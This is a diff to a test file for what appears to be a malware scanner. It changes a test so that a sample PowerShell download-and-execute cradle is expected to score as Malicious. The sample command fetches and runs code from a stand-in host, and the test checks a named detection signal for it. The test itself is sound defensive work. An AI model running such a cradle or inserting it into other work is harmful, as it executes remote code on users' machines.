@@ -154,10 +154,15 @@ def test_scan_rule_hit_is_suspicious(tmp_path, db):
         b"powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://bad.example/x')\""
     )
     report = scan_path(tmp_path, db, BUILTIN_RULES)
-    assert report.verdict is Verdict.SUSPICIOUS
+    # The rule hit itself is a Suspicious-grade rule detection…
     det = report.detections[0].assessment.detections[0]
     assert det.kind == "rule"
     assert det.name == "Suspicious_PowerShell_Download"
+    # …and since v1.0.4 the decoded-text cradle signals score the
+    # full download-and-execute pattern as what it is: Malicious.
+    assert report.verdict is Verdict.MALICIOUS
+    signal_names = {s.name for s in report.detections[0].assessment.signals}
+    assert "powershell_download_cradle" in signal_names
 
 
 def test_scan_critical_rule_hit_is_malicious(tmp_path, db):
